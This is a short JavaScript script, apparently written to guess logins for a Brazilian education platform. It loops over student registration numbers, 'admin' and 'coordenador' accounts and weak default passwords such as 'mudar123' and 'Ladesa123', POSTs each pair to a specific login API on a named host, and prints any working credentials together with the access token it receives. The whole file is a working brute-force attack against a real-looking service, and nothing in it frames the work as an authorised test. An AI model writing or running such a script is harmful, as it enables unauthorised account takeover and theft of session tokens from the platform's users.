const matriculas = [
  "2025102020039",
  "2025102020040",
  "2025102020041",
  "2025102020042",
  "2025102020043",
  "admin",
  "coordenador",
  "1234567",
  "1111111"
];
const passwords = [
  "123",
  "123456",
  "mudar123",
  "admin",
  "Ladesa123",
  "ladesa"
];

async function tryLogin() {
  for (const m of matriculas) {
    for (const p of passwords) {
      try {
        const response = await fetch("https://dev.ladesa.com.br/api/v1/autenticacao/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ matricula: m, senha: p })
        });
        if (response.ok) {
          const data = await response.json();
          if (data.access_token) {
            console.log(`SUCCESS: matricula: ${m}, password: ${p}`);
            console.log("Token:", data.access_token);
            return;
          }
        }
      } catch (e) {
        // ignore
      }
    }
  }
  console.log("No valid credentials found.");
}
tryLogin();
